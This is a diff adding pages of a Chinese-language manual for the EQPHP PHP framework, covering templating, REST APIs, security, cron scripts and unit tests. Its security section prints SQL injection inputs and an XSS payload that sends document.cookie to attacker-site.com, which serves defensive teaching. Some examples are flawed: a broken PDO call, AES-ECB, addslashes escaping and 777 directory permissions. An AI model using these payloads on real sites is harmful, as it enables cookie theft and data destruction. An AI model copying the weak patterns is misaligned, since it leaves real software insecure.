+            <b class="i24"></b><i>&lt;!--定义母版可编写区域--&gt;</i><br>
+            <b class="i24"></b><span class="fs18">{block name="main"}{/block}</span><br><br>
+
+            <b class="i24"></b>{include file="user/block/guide_tags.html"}<br>
+            &lt;/div&gt;<br><br>
+
+
+            {include file="user/block/center_footer.html"}<br>
+            {include file="plugin/popup.html"}<br>
+            &lt;/body&gt;
+            &lt;/html&gt;
+        </code>
+
+        <p>子视图(view/user/follow.html)调用：</p>
+        <code>
+            {extends file="user/layout/center.html"}<br><br>
+
+            {block name="main"}<br>
+            <i>&lt;!--这块地是你的，请自由开发……--&gt;</i><br>
+            {/block}<br>
+        </code>
+
+
+    </div>
+
+
+
+    <div class="item">
+
+        <p>近来移动互联网兴起，数据交换越来越剧烈，终端设备也目不暇接，产品更新换代越来越频繁。为快速适应市场需求、跟进市场变化，面向服务(SOA)开发思想越来越受到广大互联网企业的青睐。</p>
+        <p>服务设备与终端通过json或xml等数据格式快速交换数据，服务端处理业务逻辑、数据存储、查询；终端渲染用户操作界面，包装服务端响应的数据、发送用户请求(数据包）给服务端进而完成需求供应之间的交换。</p>
+
+        <p>目前较流行的java(server api) - php(server proxy) - html+javaScript模式组合与php(server api) - html+javaScript模式组合成为众多互联网企业主流架构方案，接下来我们就一起探讨一下EQPHP在这两种模式方案如何运用。<br><br>
+
+
+            <strong>一、php调用java提供服务API</strong><br>
+
+
+            1、配置api接口参数(config/local/api.php)：<br>
+            <code>
+                
+
+                return [<br>
+                <b class="i24"></b>'service'=>[<br>
+                <b class="i48"></b>'auth'=>'http://192.16.1.38:80',<br>
+                <b class="i48"></b>'user'=>'http://192.16.1.37:80',<br>
+                <b class="i48"></b>'search'=>'http://192.16.1.42:80',<br>
+                <b class="i48"></b>'credit'=>'http://192.16.1.40:80',<br>
+                <b class="i48"></b>'bank'=>'http://192.10.0.203:9005',<br>
+                <b class="i48"></b>'trade'=>'http://192.10.0.202:9006',<br>
+                <b class="i24"></b>],<br><br>
+                <b class="i24"></b>'api'=>[<br>
+                <b class="i48"></b>'login'=>'auth.login',<br>
+                <b class="i48"></b>'register'=>'auth.register',<br>
+                <b class="i48"></b>'user_profile'=>'user.profile',<br>
+                <b class="i48"></b>'credit_report'=>'credit.report',<br>
+                <b class="i48"></b>'payment'=>'trade.payment',<br>
+                <b class="i48"></b>'collection'=>'trade.collection',<br>
+                <b class="i48"></b>'withdraw'=>'trade.withdraw',<br>
+                <b class="i48"></b>'bank_card'=>'bank.card',<br>
+                <b class="i24"></b>],<br><br>
+                ];
+
+            </code><br><br>
+
+
+            2、确保(library/api.php)类库存在，以如下方式调用api服务：
+            <code>
+                
+
+                <i>//查询用户基本信息</i><br>
+                $user_id='4aa5d92c-cfa3-45a1-9dce-09b87a9a3359';<br>
+                $header['Authorization']=session::get('Authorization');<br>
+                $user_profile=with('api','user_profile')->header($header)->get($user_id)->call('body');<br>
+                out($user_profile);<br>
+                <i>//打印结果如下：<br>
+                    [<br>
+                    <b class="i24"></b>[user_id] => 4aa5d92c-cfa3-45a1-9dce-09b87a9a3359<br>
+                    <b class="i24"></b>[nick_name] => 梦里她是美人<br>
+                    <b class="i24"></b>[sex] => female<br>
+                    <b class="i24"></b>[birthday] => 1992-10-08<br>
+                    <b class="i24"></b>[last_login_time] => 2014-05-18 15:31:22<br>
+                    <b class="i24"></b>[wallet] => [<br>
+                    <b class="i72"></b>[money] => 15000.25<br>
+                    <b class="i72"></b>[point] => 881<br>
+                    <b class="i48"></b>]<br><br>
+
+                    <b class="i24"></b>[bank_card] => [<br>
+                    <b class="i72"></b>[bank_name] => 中国工商银行<br>
+                    <b class="i72"></b>[account] => 张三<br>
+                    <b class="i72"></b>[card_number] => 62271548245214<br>
+                    <b class="i48"></b>]<br>
+                    ]
+                </i><br><br>
+
+                <i>//用户提现</i><br>
+                $data=['money'=>260,'bank_card'=>'icbc'];<br>
+                $header['Authorization']=session::get('Authorization');<br>
+                $result=with('api','withdraw')->header($header)->post($data)->call('response');<br>
+
+            </code><br><br><br>
+
+            <strong>二、php开发服务api</strong><br>
+            <code>
+
+                class a_heartbeat extends a_restful{<br><br>
+
+                <b class="i24"></b>private $cycle;<br>
+                <b class="i24"></b>protected $category;<br><br>
+
+                <b class="i24"></b>function __construct($category, $cycle = 60){<br>
+                <b class="i48"></b>parent::__construct();<br>
+                <b class="i48"></b>$this->cycle = $cycle;<br>
+                <b class="i48"></b>$this->category = $category;<br>
+                <b class="i48"></b>$this->model = with('m_heartbeat', $category, $cycle);<br>
+                <b class="i24"></b>}<br><br>
+
+                <b class="i24"></b>function get(){<br>
+                <b class="i48"></b>$no = url('no', 'uuid');<br>
+                <b class="i48"></b>$user = $this->model->get($no);<br>
+                <b class="i48"></b>$this->response(0, 'ok', $user);<br>
+                <b class="i24"></b>}<br><br>
+
+                <b class="i24"></b>function post(){<br>
+                <b class="i48"></b>$option = ['name' => 'title', 'no' => 'uuid', 'manager' => 'account'];<br>
+                <b class="i48"></b>$data = input::filter($option, 'post');<br>
+                <b class="i48"></b>try {<br>
+                <b class="i72"></b>$manager_id = $this->model->create($data);<br>
+                <b class="i72"></b>$this->response(0, 'ok', $manager_id);<br>
+                <b class="i48"></b>} catch (Exception $e) {<br>
+                <b class="i72"></b>logger::exception('heartbeat', $e->getMessage());<br>
+                <b class="i72"></b>$this->response(1, 'create manager fail: ' . $e->getMessage());<br>
+                <b class="i48"></b>}<br>
+                <b class="i24"></b>}<br><br>
+
+                <b class="i24"></b>function put(){<br>
+                <b class="i48"></b><i>//TODO</i><br>
+                <b class="i24"></b>}<br><br>
+
+                <b class="i24"></b>function delete(){<br>
+                <b class="i48"></b><i>//TODO</i><br>
+                <b class="i24"></b>}<br><br>
+
+                <b class="i24"></b>function head(){<br>
+                <b class="i48"></b><i>//TODO</i><br>
+                <b class="i24"></b>}<br><br>
+
+                <b class="i24"></b>function __destruct(){<br>
+
+                <b class="i24"></b>}<br><br>
+
+                }
+
+            </code><br>
+
+    <p><strong>接口文档如下：</strong><br><br>
+        <code>1、API标准：restful（get/post/put/delete/head/options）<br>
+        2、交互数据格式：Content-Type:application/json; charset=utf-8<br>
+        3、资源header参数：<br>
+            <b class="i24"></b>请求方式（Request-Method:get）<br>
+            <b class="i24"></b>版本（If-Match:1.0.1）<br>
+            <b class="i24"></b>授权（Token:XyBuVhT1BjOV7UJH8jhXl4dVY2b2VZbFJ0a3ujGH=）<br>
+            <b class="i24"></b>分页（Range:1/20）<br>
+        4、API测试环境地址：http://api.eqphp.com/<br>
+        5、资源接口：dictionary、login、register、user、profile、letter ...<br>
+        6、Token有效期为3天（72hours）<br>
+        7、最新版本更新地址：<br>
+            <b class="i24"></b>http://www.eqphp.com/file/app/ios/user_center.ipa<br>
+            <b class="i24"></b>http://www.eqphp.com/file/app/android/user_center.apk<br>
+        8、公共异常码：<br>
+        <b class="i24"></b>1.undefined request method<br>
+        <b class="i24"></b>2.error application version<br>
+        <b class="i24"></b>3.token expire<br>
+        <b class="i24"></b>4.unauthorized<br>
+        <b class="i24"></b>5.frozen user<br><br>
+
+        9、各API异常码：<br>
+        <b class="i24"></b>login-post<br>
+        <b class="i24"></b>11.format error account<br>
+        <b class="i24"></b>12.password error<br>
+
+        <b class="i24"></b> ...<br><br><br>
+
+            --------------------------------------------<br>
+            --------------------------------------------<br><br><br>
+
+
+            [login]<br>
+            --------------------------------------------<br>
+            post<br>
+            param：{"account":"art","password":"aa1e46507e859ad8eed5420a9811c4df"}<br>
+            response：<br>
+            {<br>
+            "error": 0,<br>
+            "message": "ok",<br>
+            "data": "XyBuVhT1BjOV7UJH8jhXl4dVY2b2VZbFJ0a3ujGH="<br>
+            }<br>
+
+        </code>
+    </p>
+
+    </div>
+
+
+
+    <div class="item">
+
+        <p>项目安全是一个不容忽视的话题，一直以来均是互联项目不可轻视的技术环节。EQPHP就数据接收过滤、sql注入、csrf攻击、xss攻击、SSL服务、AES跨平台数据加密传输等相关技术点略做使用讲解。<p><br>
+
+        <strong>一、用户请求数据接收过滤</strong><br>
+        <p>开发人员不应信任用户的任何请求数据（如GET 、POST、REQUEST、COOKIE、SERVER），对所有接收数据一一过滤是项目安全的基本保障。保证业务数据安全、合法、有效是项目稳定运行的基本前提。EQPHP的input类(library/input.php)提供各种数据格式的安全校验与过滤，具体用法如下：</p>
+        <code>
+            
+
+            class a_profile extends a_auth{<br><br>
+
+            <b class="i24"></b><i>//用户完善信息</i><br>
+            <b class="i24"></b>function post(){<br>
+            <b class="i48"></b>$phone=input::post('post','phone');<br>
+            <b class="i48"></b>$email=input::post('email','email');<br>
+            <b class="i48"></b>$sex=input::post('sex','/^(male|female)$/');<br>
+            <b class="i48"></b>$referrer=input::post('referrer','int');<br>
+            <b class="i48"></b>$birthday=input::post('birthday','date');<br>
+            <b class="i48"></b>$data=compact('phone','email','sex','birthday','referrer');<br>
+            <b class="i48"></b>s_user::save_profile($data,$this->user_id);<br>
+            <b class="i48"></b>$this->response(0,'ok');<br>
+            <b class="i24"></b>}<br><br>
+
+
+            }<br>
+        </code><br>
+
+        <strong class="fcy1">Tip：</strong>input::post($name,$mode) 第二个参数可接收的值有<br>
+        post/isset/title/int/text/number/float/account/date/time/date_time/many/正则表达式(包括已注册正则,即library/regexp.php类生命的成员属性)。<br><br><br>
+
+
+        <strong>二、SQL 注入与数据库安全</strong><br>
+        <p>在那个年代，大家一般用拼接字符串的方式来构造动态 SQL 语句创建应用，于是  SQL 注入成了很流行的攻击方式，近些年来参数化查询(如PDO)已经成了普遍用法，<br>我们已经离 SQL 注入很远了。合理使用EQPHP提供的数据接收过滤方法，基本可以杜绝sql注入漏洞，使用PDO预编译sql语句使的SQL语句更加健康安全。</p>
+
+        <code>
+            
+
+            <i>//1、SQL注入案例</i><br>
+            <i>//当表单输入的内容里有单（'）双（"）引号时，这两条SQL语句均报错，无法正常执行；</i><br>
+            <i>//当表单输入：book" or "1"="1时，执行$query会查询出所有数据；</i><br>
+            <i>//当表单输入：book"; delete from user where id>"0时，有可能删掉所有用户数据；</i><br>
+            $insert='insert into news (details) values ("'.$_POST['details'].'")';<br>
+            $query='select * from news where details="'.$_POST['details'].'"';<br>
+            <i>//要觉以上问题，就必须对魔术引号（即单双引号）做处理，即转义或完全过滤。</i><br>
+            <i>接收时用addslashes函数(也可以考虑mysql_real_escape_string)转义，输出时用stripslashes反转义，
+                <br>当然不要忘记用get_magic_quotes_gpc函数检测系统是否自动开启防止重复转义。</i><br><br>
+
+
+            <i>//2、PDO预编译sql语句</i><br>
+            $this->pdo = db::pdo();<br>
+            $pattern = 'select id,phone from user where account=:account and password=:account limit 1';<br>
+            $condition = [':account'=>$_GET['account'],':password'=>$_GET['password']];<br>
+            $user = db::pdo()->prepare($pattern)->execute($pattern)->fetch(PDO::FETCH_ASSOC);<br>
+
+        </code><br><br>
+
+        <strong>三、跨站脚本攻击(XSS)</strong><br>
+
+        <p>攻击者通过富文本(含有html或javaScript脚本的文本内容)输入框提交具有破坏性(影响页面样式结构、交互操作功能等)的文本到数据库，等那个页面需要输出这些富文本时攻击将发生。如下代码：</p>
+
+        <code>
+            &lt;div style="margin-top:15000px; width:15000px;"&gt;<br>
+            <b class="i24"></b>&lt;a href="http://attacker-site.com/傻子来了" target="_self"&gt;点击下载&lt;/a&gt;<br>
+            <b class="i24"></b>&lt;img src="http://attacker-site.com/mv.gif" alt="美女脱衣舞"<br>
+            <b class="i24"></b>onclick="document.location='http://attacker-site.com/xss.php?param='+ decodeURI(document.cookie) +';'"&gt;<br>
+            &lt;/div&gt;<br><br>
+            &lt;script type="application/javascript"&gt;<br>
+            <b class="i24"></b>alert("哈哈，你被XSS了！");<br>
+            <b class="i24"></b>location.reload();<br>
+            <b class="i24"></b>location.href="http://www.eqphp.com/跳到我这儿来";<br>
+            &lt;/script&gt;
+        </code><br>
+
+        <p>这对上述情况可以转html实体(htmlspecialchars)或过滤(strip_tags)（接收前过滤或输出前过滤）。EQPHP框架里使用方法如下：</p>
+
+        <code>
+
+            <i>//接收时过滤(htmlspecialchars、strip_tags过滤)</i><br>
+            $title=post('title','title'); <br>
+            $detail=post('detail','text');<i>//可在config/local/secure.php文件配置允许标签</i><br><br>
+
+            <i>//检测存在危险数量</i><br>
+            $risk_amount=secure::xss($detail,'check');<i>//3</i><br>
+            <i>//严格过滤</i><br>
+            $detail=secure::xss($detail);<br><br>
+
+            <i>//输出时过滤(htmlspecialchars、strip_tags过滤)</i><br>
+            {$title|put},{$title|put:"&lt;img&gt;&lt;a&gt;"}
+        </code><br><br>
+
+        <strong>四、跨站请求伪造(CSRF)</strong><br>
+        <p>至于什么是CSRF攻击、有什么危害？暂且不谈，这里仅说说使用EQPHP框架如何防止CSRF攻击。</p>
+        <code>
+            <i>//step-1、控制器调用CSRF令牌生成器</i><br>
+            $csrf=secure::csrf('set');<br><br>
+
+            <i>//step-2、并将生成令牌分配给表单隐藏域(如果是ajax请求可以直接从cookie获取)</i><br>
+            &lt;input name="token" type="hidden" value="{$csrf}"&gt;<br><br>
+
+            <i>//step-3、接收并校验表单提交的令牌token(和session中存储的对比)</i><br>
+            if (secure::csrf('check',post('token'))) {<br>
+                <b class="i24"></b><i>//安全的请求，csrf检测</i><br>
+            }<br>
+        </code><br><br>
+
+        <strong>五、AES跨平台数据加密传输</strong><br>
+        <p>有时跨平台数据交换处理想要不被代理或黑客劫取，或者不想暴露用户的隐私数据，我们都可以使用AES加密后传输。</p>
+        <code>
+            <i>//AES-128(ecb)模式</i><br>
+            $encrypted=with('crypt','secret_key')->encrypt('待加密明文');
+        </code><br><br>
+    </div>
+
+    <div class="item">
+        <p>web项目国际化是一个很复杂的过程，体现在界面说明文字、脚本交互提示、单位转换、时区时间格式、国际化后适应各语言的界面样式变化、以及各国家地区人的生活习惯等因素考虑，所以一个大项目工程要做到完全本地化、地域话作量巨大。</p>
+
+
+        <strong>一、操作界面说明文字国际化：</strong><br>
+        1、配置语言包(data/lang/cn/user.php):<br>
+        <code>
+            return [<br>
+            <b class="i24"></b>'status'=>[<br>
+            <b class="i48"></b>'unactivated'=>'未激活',<br>
+            <b class="i48"></b>'normal'=>'正常',<br>
+            <b class="i48"></b>'freeze'=>'冻结',<br>
+            <b class="i48"></b>'deleted'=>'用户注销',<br>
+            <b class="i48"></b>'drop'=>'管理员删除',<br>
+            <b class="i24"></b>],<br>
+            ];
+
+        </code><br><br>
+
+        2、调用方式一（在视图直接调用）：<br>
+        <code>
+            <!--在视图直接调用，这种方式性能稍差-->
+            {lang('user:status.normal')}
+        </code><br>
+
+        <strong class="fcy1">Tip：</strong>将用户的选择语种存入session('i18n'=>'cn')<br><br>
+
+        3、调用方式二（控制器分配语言包给视图，视图解析）：<br>
+        <code>
+            
+
+            class a_user{<br><br>
+
+            <b class="i24"></b>function register(){<br>
+            <b class="i48"></b><i>//分配视图所需语言包</i><br>
+            <b class="i48"></b>$data['i18n']=lang('user');<br>
+            <b class="i48"></b>smarty()->assign($data)->display('user/register');<br>
+            <b class="i24"></b>}<br><br>
+
+            }<br>
+
+        </code><br>
+        视图解析：
+        <code>
+            {$i18n|lang:'status.normal'}
+        </code><br><br>
+
+        <strong>二、脚本交互提示国际化：</strong><br>
+        <p>配置json语言包，要用的地方直接调用json语言包对象：</p>
+        <code>
+            $(function () {<br>
+            <b class="i24"></b>$('.phone_tip').html(i18n.login.phone.format_error);<br>
+            });
+        </code><br><br>
+
+
+        <strong>三、单位转换：</strong><br>
+        <code>
+            {$wallet.money|unit:'currency'}
+        </code><br><br>
+    </div>
+
+    <div class="item">
+        <p>在大多数人眼里，PHP是用来编写动态网页的，很多人鲜知其web模式（apache、nginx等web服务器运行的模块模式），而很少使用cli模式（命令行运行Command Line Interface）。cli多进程（Thread）属性更显PHP广泛性应用，如数据采集，邮件、短信、消息通知发送，周期性数据更新处理等，常见的如部署计划任务（crontab）、运行单元测试用例（PHP unit）。<br><br></p>
+
+        <strong>一、开发简单的计划任务脚本</strong><br>
+        <p>使用EQPHP编写计划任务脚本简单方便，方法如下，在data/crontab/目录下创建脚本文件send_message.php</p>
+
+        <code>
+            <i>//加载框架环境运行依赖脚本</i><br>
+            include 'crontab.php';<br><br>
+
+            <i>//查询待发短信、每隔1秒发送一条</i><br>
+            $condition['times'] = ['elt', 3];<br>
+            $condition['create_time'] = ['gt', date('Y-m-d H:i:s', strtotime('-3 hours'))];<br>
+            $message_list = query('message_task')->select('id,phone,message')->where($condition)-limit(30)->out('batch');<br>
+            $handle = new message('dx001', 'service_message');<br>
+            foreach ($message_list as $value) {<br>
+            <b class="i24"></b>$result = $handle->send($value['phone'], $value['message']);<br>
+            <b class="i24"></b>if ($result['code'] == 200) {<br>
+            <b class="i48"></b>db::delete('message_task', $value['id']);<br>
+            <b class="i24"></b>} else {<br>
+            <b class="i48"></b>db::patch('message_task', 'times=times+1', $value['id']);<br>
+            <b class="i24"></b>}<br>
+            <b class="i24"></b>sleep(1);<br>
+            }<br>
+        </code><br>
+        <p>添加crontab定时周期性执行任务命令：<br>
+            <code>5 * * * * /usr/local/php/bin/php /var/www/data/crontab/send_message.php</code></p><br><br>
+
+        <strong>二、执行命令中使用参数</strong><br>
+        <p>cli模式不同于web模式，可使用$_GET全局变量，但可以使用$argv，稍作处理即可使用$_GET，<br>
+            具体参考手册（http://php.net/manual/en/features.commandline.php），EQPHP已做处理，使用方法如下。<br>
+            <code>
+                <i>//加载框架环境运行依赖脚本</i><br>
+                include 'crontab.php';<br><br>
+
+                <i>//命令行：php /var/www/data/crontab/test.php "category=toy&start=5"</i><br><br>
+
+                $start = input::get('start','int');<br>
+                $category = input::get('category','account');<br>
+                echo $category,',',$start; <i>//toy,5</i><br>
+            </code>
+        </p><br><br>
+
+
+        <strong>三、使用类结构开发任务脚本</strong><br>
+        <p>我们可以将同一类任务以类的形式组织在一起，方便代码公用，统一部署。如以下的业务状态推送任务：
+
+            <code>
+                <i>//加载框架环境运行依赖脚本</i><br>
+                include 'crontab.php';<br><br>
+
+                <i>//命令行（静态方法用::符号连接类名、方法名,否则用/符号）：<br>
+                php /var/www/data/crontab/push_service_status.php "action=finance::receivable"<br>
+                php /var/www/data/crontab/push_service_status.php "action=finance/notify"<br>
+                php /var/www/data/crontab/push_service_status.php "action=finance/refund"</i><br><br>
+
+                class finance{<br><br>
+
+                const PARTNER_URL = 'https://###';<br><br>
+
+                protected $data = [];<br><br>
+
+                function __construct(){<br>
+                <b class="i24"></b>$this->data = with('current_finance_task', 'pending')->get(100);<br>
+                <b class="i24"></b><i>//……</i><br>
+                }<br><br>
+
+                static function receivable(){<br>
+                <b class="i24"></b><i>//TODO</i><br>
+                }<br><br>
+
+                public function refund(){<br>
+                <b class="i24"></b>$option = ['type' => 'json', 'xml_tag' => '', 'is_array' => true];<br>
+                <b class="i24"></b>$data = ['refund_code' => 'AD_699', 'money' => 15000, 'request_time' => time()];<br>
+                <b class="i24"></b>http::curl(self::PARTNER_URL . 'refund', $data, null, $option);<br>
+                }<br><br>
+
+                public function notify(){<br>
+                <b class="i24"></b>http::curl(self::PARTNER_URL . 'notify', 'thanks clear finance for eqphp');<br>
+                }<br><br>
+
+                }<br>
+            </code>
+
+        </p>
+
+
+
+
+    </div>
+
+    <div class="item">
+
+        <p>需求不变，测试用例则不变，改动或优化业务代码可以通过运行测试用例发现缺陷，这便是以不变应万变之良策：测试驱动开发（TDD）。</p><br>
+        <p>web应用由于其需求变化频繁、更新迭代迅速等特点导致大多数PHP开发者严重漠视单元测试、TDD开发模式，甚至根本就不知有单元测试、TDD等软件工程中的这些概念...废话不多说，EQPHP单元测试用例如下：</p><br>
+
+        <strong>一、工具方法、业务类测试</strong><br><br>
+        <p>在test/unit/目录下创建测试用例脚本demoTest.php<br>
+            <code>
+                <i>//加载框架环境运行依赖脚本</i><br>
+                include 'baseTest.php';<br><br>
+
+                class demoTest extends PHPUnit_Framework_TestCase{<br><br>
+
+                <i>/**<br>
+                    * @dataProvider additionProvider<br>
+                    */</i><br>
+                function testTool($phone,$result){<br>
+                <b class="i24"></b><i>//测试工具类方法</i><br>
+                <b class="i24"></b>$this->assertEquals($result, regexp::match($phone,'phone'));<br>
+                }<br><br>
+
+                public function additionProvider(){<br>
+                <b class="i24"></b>return [<br>
+                <b class="i48"></b>1 => ['15011322***', true],<br>
+                <b class="i48"></b>2 => ['15202921***', true],<br>
+                <b class="i48"></b>3 => ['15847586***', true],<br>
+                <b class="i48"></b>4 => ['19985410***', true],<br>
+                <b class="i24"></b>];<br>
+                }<br><br>
+
+                <i>//测试业务类</i><br>
+                function testServer(){<br>
+                <b class="i24"></b>$point = point('common', 2, 'register')->execute();<br>
+                <b class="i24"></b>$this->assertEquals(50, $point);<br>
+                }<br><br>
+
+                }<br><br>
+
+
+                <i>//命令行运行命令、结果：<br>
+                    $phpunit /var/www/test/unit/demoTest.php<br>
+                    PHPUnit 4.8.31 by Sebastian Bergmann and contributors.<br><br>
+
+                    ...F..<br><br>
+
+                    Time: 1.69 seconds, Memory: 13.75MB<br><br>
+
+                    There was 1 failure:<br><br>
+
+                    1) demoTest::testTool with data set "d" ('19985410142', true)<br>
+                    Failed asserting that 0 matches expected true.<br><br>
+
+                    G:\wamp2.5\www\test\unit\demoTest.php:14<br><br>
+
+                    FAILURES!<br>
+                    Tests: 6, Assertions: 6, Failures: 1.<br>
+                </i>
+            </code><br>
+            从运行结果可以看出，由于手机号19985410142正则匹配失败，断言匹配成功，因而报告测试失败用例。
+        </p><br>
+
+
+
+
+        <strong>二、各模块MVC代码测试</strong><br><br>
+        <p>在test/unit/目录下创建测试用例脚本moduleTest.php<br>
+            <code>
+                <i>//声明测试模块</i><br>
+                define('MODULE_NAME', 'user');<br><br>
+                <i>//加载框架环境运行依赖脚本</i><br>
+                include 'baseTest.php';<br><br>
+
+                class moduleTest extends PHPUnit_Framework_TestCase{<br><br>
+
+                <i>//模型</i><br>
+                function testModel(){<br>
+                <b class="i24"></b>$user = m_login::login(array('qq' => '2581221391'), md5('123456'));<br>
+                <b class="i24"></b>$this->assertEquals(2, $user['id']);<br>
+                }<br><br>
+
+                }<br><br>
+
+
+                <i>//命令行运行命令、结果：<br>
+                    $phpunit /var/www/test/unit/moduleTest.php<br>
+                    PHPUnit 4.8.31 by Sebastian Bergmann and contributors.<br><br>
+
+                    .<br><br>
+
+                    Time: 712 ms, Memory: 13.50MB<br><br>
+
+                    OK (1 test, 1 assertion)<br><br>
+                </i>
+            </code><br>
+            从运行结果可以看出，测试通过，用户ID为2的用户增加一条登录日志。
+        </p><br><br><br>
+
+
+        <strong>三、TDD案例 - 用户提现</strong><br><br>
+        <p>TDD开发模式要求我们先编写测试用例，而后在开发产品业务功能代码，我们先创建用户提现功能测试用例.</p>
+        <p>在test/unit/目录下创建测试用例脚本withdrawTest.php<br>
+            <code>
+                <i>//声明测试模块</i><br>
+                define('MODULE_NAME', 'user');<br><br>
+                <i>//加载框架环境运行依赖脚本</i><br>
+                include 'baseTest.php';<br><br>
+
+                class withdrawTest extends PHPUnit_Framework_TestCase{<br><br>
+
+                const WITHDRAW_USER_ID = 1;<br>
+                private $user_balance;<br>
+                private $withdraw_money = 0;<br><br>
+
+                public function __construct(){<br>
+                <b class="i24"></b>$this->user_balance = with('m_user', self::WITHDRAW_USER_ID)->get_balance();<br>
+                }<br><br>
+
+
+                <i>//异常：提现金额大于账户余额</i><br>
+                public function testAccountBalanceShortage(){<br>
+                <b class="i24"></b>$this->withdraw_money = $this->user_balance + 100;<br>
+                <b class="i24"></b>$this->setExpectedException('sException', 'balance shortage',512);<br>
+                <b class="i24"></b>with('s_withdraw', self::WITHDRAW_USER_ID)->create($this->withdraw_money);<br>
+                }<br><br>
+
+                <i>//正常提现测试</i><br>
+                public function testAccount(){<br>
+                <b class="i24"></b>if ($this->user_balance > 0) {<br>
+                <b class="i48"></b>$this->withdraw_money = $this->user_balance;<br>
+                <b class="i48"></b>with('s_withdraw', self::WITHDRAW_USER_ID)->create($this->withdraw_money);<br>
+                <b class="i48"></b>$this->user_balance = with('m_user', self::WITHDRAW_USER_ID)->get_balance();<br>
+                <b class="i48"></b>$this->assertEquals(0, $this->user_balance);<br>
+                <b class="i24"></b>}<br>
+
+                }<br><br>
+
+
+                <i>//命令行运行命令、结果：<br>
+                    $phpunit /var/www/test/unit/withdrawTest.php<br>
+                    PHPUnit 4.8.31 by Sebastian Bergmann and contributors.<br><br>
+
+                    .<br><br>
+
+                    Time: 1512 ms, Memory: 98.40MB<br><br>
+
+                    OK (1 test, 1 assertion)<br><br>
+                </i>
+            </code><br>
+            从运行结果可以看出，测试通过。
+        </p>
+
+
+
+
+    </div>
+
+        <div class="item">
+
+            <strong>一、文件、类库加载</strong><br>
+            <p>1、普通加载：EQPHP采用自动加载规则（依据类名前缀/后缀、所处模块）完成类库加载，无需手动加载。如：<br>
+                <code>basic::cut($string,12); <i>//会自动加载library/basic.php文件；</i><br>
+                    with('m_user',$this->user_id); <i>//会自动加载user/model/m_user.php文件；</i><br>
+                    config('site.frame.name'); <i>//会自动加载config/local/system.php文件；</i></code><br><br>
+            </p>
+
+            <p>2、贪婪加载：有时你可能想要将同一功能的几个类库文件放入一个子文件夹中。如：<br>
+                server/point/s_point_interface.php、server/point/s_point_rule.php;<br>
+                这时你需要修改配置文件config/local/system.php中state.greedy_load=true（即开启贪婪加载模式）；<br>
+                系统会自动由父级目录向子级目录搜索，搜到一个便停止搜索，加载搜索到的这个文件（即父目录优先）；<br>
+                这种方式搜索目录可以无限深，考虑性能建议不要超过3级；<br><br>
+            </p>
+
+            <p>3、通用加载：很多情况下，我需要使用同一控制器（或model类）做顶级控制器，各个模块（分组）同用这一个文件（都继承这个类），如：<br>
+                a_user extends a_restful; a_user 类来自于user/action/a_user.php文件，a_restful 类来自于action/a_restful.php文件；<br>
+                需要修改配置文件config/local/system.php中state.common_load=true；<br>
+                开启后，根目录下的action、model目录可可作为顶级类库，即本模块未找到所需类库是时会去这两个顶级目录查找、加载；<br><br>
+            </p>
+
+            <p>4、配置加载：配置文件我们常需要公共配置+各环境私自配置这种形式。这种情况加载模式是：同一文件名，私自配置的优先加载，即覆盖公共配置。<br><br>
+            </p>
+
+            <p>5、手动加载：如果你想要跨模块加载类库，或引入第三方类库，你则需要手动加载。EQPHP框架提供help::load()工具函数，具体用法参见手册工具类详解。<br>
+                处于安全、规范化考虑，不建议频繁使用help::load()函数。<br><br>
+            </p>
+
+            <strong>二、设置域名</strong><br>
+            <p>正确填写config/local/system.php文件中的domian配置项即可，allow_host是指一个项目需要绑定多个域名（包括二级域名、静态资源域名）时对外所有可以访问的域名均需添加进来。<br><br></p>
+
+            <strong>四、资源访问权限设置</strong><br>
+            <p>通常情况下将data、file（.htaccess文件中添加file目录对外可方位）、cache、log目录设为777，其余设置为755即可。<br><br></p>
+
+            <strong>三、常见项目结构</strong><br>
+
+            <p>目前较流行的项目结构大致有：简单的MVC结构、基于restful风格的API结构、多模块混合结构三种，具体情况根据项目需求逻辑而定，切莫死搬硬套。<br><br></p>
+
+            <strong>1、simple single MVC</strong><br>
+            <p>对于功能简单的应用，如品牌展示网站、博客、资讯分享等小项目，使用简单的MVC结构即可满足需求。<br><br></p>
+
+            <strong>2、restful API</strong><br>
+            具体用法请参见目录：“restful、API开发”章节。<br><br>
+
+            <strong>3、multi-module structure</strong><br>
+            <p>step-1、注册模块名称：config/local/system.php</p>
+            <code>
+                'module'=>array(<br>
+                <b class="i24"></b>'list'=>array('common','admin','user','blog','message','wap'),<br>
+                <b class="i24"></b>'subdomain'=>array(),<br>
+                ),
+            </code><br>
+
+            <p>step-2、创建模块目录结构：http://127.0.0.1/command/module/create/:module_name</p>
+            <code>
+                module_name<br>
+                ├─action<br>
+                ├─config<br>
+                ├─model<br>
+                └─plugin
+            </code><br>
+
+            <p>step-3、代码填充、功能实现</p>
+
+        </div>
+
+    <div class="item">
+
+        <table class="manual">
+            <tr><th width="180px">含义</th><th width="150px">名称</th><th>值</th></tr>
+            <tr class="fs18 fcb1"><td colspan="3">基本常量</td></tr>
+            <tr><td>项目根目录</td><td>PATH_ROOT</td><td>/var/www/</td></tr>
+            <tr><td>当前运行环境</td><td>ENVIRONMENT</td><td>local,test,similar,product</td></tr>
+            <tr><td>当前运行模式</td><td>RUN_MODE</td><td>web,cli</td></tr>
+
+            <tr class="fs18 fcb1"><td colspan="3">web模式常量</td></tr>
+            <tr><td>当前运行模块名称</td><td>MODULE_NAME</td><td>user</td></tr>
+            <tr><td>当前运行模块为子域名</td><td>SUBDOMAIN</td><td>user</td></tr>
+            <tr><td>当前执行控制器</td><td>CURRENT_ACTION</td><td>test:index</td></tr>
+            <tr><td>当前访问域名</td><td>SITE_DOMAIN</td><td>www.eqphp.com</td></tr>
+            <tr><td>当前访问参数</td><td>URL_REQUEST</td><td>user/test?id=21189</td></tr>
+            <tr><td>当前访问协议、域名</td><td>U_R_L</td><td>http://www.eqphp.com/</td></tr>
+            <tr><td>当前访问完整URL</td><td>URL_URI</td><td>http://www.eqphp.com/user/test</td></tr>
+
+            <tr class="fs18 fcb1"><td colspan="3">目录常量</td></tr>
+            <tr><td>项目配置文件</td><td>PATH_CONFIG</td><td>/var/www/config/</td></tr>
+            <tr><td>核心类、工具类</td><td>PATH_LIBRARY</td><td>/var/www/library/</td></tr>
+            <tr><td>业务逻辑类</td><td>PATH_SERVER</td><td>/var/www/server/</td></tr>
+            <tr><td>模块类</td><td>PATH_SERVER</td><td>/var/www/module/</td></tr>
+            <tr><td>静态资源目录</td><td>PATH_FILE</td><td>/var/www/file/</td></tr>
+            <tr><td>视图目录</td><td>PATH_VIEW</td><td>/var/www/view/</td></tr>
+            <tr><td>私属数据资源</td><td>PATH_DATA</td><td>/var/www/data/</td></tr>
